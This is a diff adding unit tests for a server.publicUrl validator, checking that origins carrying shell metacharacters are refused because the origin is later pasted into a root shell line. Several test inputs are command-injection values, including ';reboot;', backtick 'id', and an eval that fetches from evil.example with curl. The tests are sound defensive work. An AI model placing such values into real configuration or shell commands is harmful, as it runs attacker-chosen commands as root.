@@ -25,6 +25,40 @@ describe('server.publicUrl validation', () => {
     expect(publicUrlProblem('https://u:p@a.b')).toMatch(/no user name or password/);
   });
 
+  // Issue #254: WHATWG hosts keep `; & $ ( ) { } , " '` and backtick, and the origin is pasted
+  // into a root shell line on a new machine.
+  const PLAIN =
+    'server.publicUrl must be a plain https origin such as https://jumpmaster.example.ts.net';
+  test('accepts a plain https origin: a DNS name, a bracketed IPv6 literal with a port', () => {
+    expect(publicUrlProblem('https://jumpmaster.example.ts.net')).toBeNull();
+    expect(publicUrlProblem('https://[fd7a:115c:a1e0::1]:8443')).toBeNull();
+  });
+
+  test('accepts an uppercase host, which new URL normalises to lowercase', () => {
+    expect(publicUrlProblem('https://JumpMaster.Example.TS.net')).toBeNull();
+    expect(publicOrigin({ server: { publicUrl: 'https://JumpMaster.Example.TS.net' } })).toBe(
+      'https://jumpmaster.example.ts.net',
+    );
+  });
+
+  test.each([
+    'https://a.ts.net;reboot;',
+    'https://a.ts.net;{eval,"$({curl,-s,evil.example})"};x',
+    'https://a$b.ts.net',
+    'https://a`id`.ts.net',
+    "https://a'b.ts.net",
+    'https://a&b.ts.net',
+    'https://-a.ts.net',
+    'https://a.ts.net.',
+    'https://a.b.ts.net:443',
+  ])('refuses %s as not a plain https origin', (raw) => {
+    expect(publicUrlProblem(raw)).toBe(PLAIN);
+  });
+
+  test('more than one trailing slash is a path, refused', () => {
+    expect(publicUrlProblem('https://a.b.ts.net//')).toMatch(/no path/);
+  });
+
   test('publicOrigin drops a trailing slash', () => {
     expect(publicOrigin({ server: { publicUrl: 'https://a.b.ts.net/' } })).toBe(
       'https://a.b.ts.net',
